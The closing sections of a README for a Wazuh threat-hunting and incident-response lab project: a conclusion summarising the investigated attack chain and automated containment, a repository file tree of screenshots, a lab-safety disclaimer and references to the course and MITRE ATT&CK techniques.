## 16. Conclusion

The escalated alert was ambiguous on its own. By hunting beyond it, the investigation established a clear chain from failed logons to a successful logon, encoded PowerShell execution, a decoded download command, and an unauthorized file creation, all mapped to MITRE ATT&CK techniques. Containment was automated with Wazuh Active Response and verified end to end through the log, the SIEM and the observed loss of connectivity, with the block applied at 00:52:36 and released at 01:02:37 as configured. The project also documents the corrections made to the lab instructions, the gaps in the evidence, and the operational trade-offs of automated blocking. The result is a complete incident record with a timeline, IOCs, action taken and recommendations.

## 17. Repository Structure

```
SOC-L2-Wazuh-Threat-Hunting/
├── README.md
├── docs/
│   └── SOC_L2_Wazuh_Threat_Hunting_Report.docx      # Full lab report (optional)
└── Screenshots/
    ├── VirtualBox_windows_11_20_10_2026_11_04_57.png   # Figure 1
    ├── VirtualBox_windows_11_26_10_2026_14_47_26.png   # Figure 2
    ├── VirtualBox_windows_11_26_10_2026_14_50_15.png   # Figure 3
    ├── VirtualBox_windows_11_26_10_2026_14_51_26.png   # Figure 4
    ├── VirtualBox_windows_11_26_10_2026_15_42_06.png   # Figure 5
    ├── VirtualBox_windows_11_26_10_2026_16_24_06.png   # Figure 6
    ├── VirtualBox_windows_11_27_10_2026_10_01_13.png   # Figure 7
    ├── VirtualBox_windows_11_26_10_2026_16_59_27.png   # Figure 8
    ├── VirtualBox_windows_11_26_10_2026_17_00_06.png   # Figure 9
    ├── VirtualBox_windows_11_27_10_2026_08_43_44.png   # Figure 10
    ├── VirtualBox_windows_11_27_10_2026_08_47_40.png   # Figure 11
    ├── VirtualBox_windows_11_27_10_2026_08_55_06.png   # Figure 12
    ├── VirtualBox_windows_11_27_10_2026_09_35_45.png   # Figure 13
    ├── VirtualBox_windows_11_27_10_2026_09_43_21.png   # Figure 14
    └── VirtualBox_windows_11_27_10_2026_09_52_43.png   # Figure 15
```

## 18. Disclaimer

This project was performed in an isolated, self-hosted laboratory environment for educational purposes. The attack activity was simulated, and the "payload" (`payload.exe`) is a harmless text file; no real malware was used and no third-party systems were accessed. All IP addresses are private lab addresses. The techniques shown should only be practiced on systems you own or are explicitly authorized to test. Findings describe the lab environment and should not be generalized to production networks without further validation.

## 19. References and Acknowledgements

- **Lab scenario and structure:** "SOC Level 2: Threat Hunting & Incident Response with Wazuh," Security Operations Center (SOC) course, module *Proactive Threat Hunting & Incident Response*, instructor Aminu Idris, AMCPN.
- **Platform:** Wazuh (SIEM/XDR) manager, agent, File Integrity Monitoring and Active Response.
- **Framework:** MITRE ATT&CK (techniques T1110, T1078, T1059.001, T1027, T1105, T1021 referenced).
- **Virtualization:** Oracle VirtualBox.
